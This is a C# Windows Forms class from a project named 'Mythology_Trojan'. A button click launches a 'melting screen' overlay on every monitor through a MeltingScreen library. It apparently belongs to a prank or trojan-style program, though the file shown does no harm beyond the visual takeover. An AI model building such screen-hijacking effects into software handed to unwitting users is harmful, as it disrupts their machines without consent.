using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MeltingScreen;

namespace Mythology_Trojan
{
    public partial class LastForm : Form
    {
        public LastForm()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void LastForm_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            {
                for (int i = 0; i < Screen.AllScreens.Length; i++)
                {
                    ShowScreenForm s = new ShowScreenForm();
                    s.Start(i, 1);
                }
            }
        }
    }
}
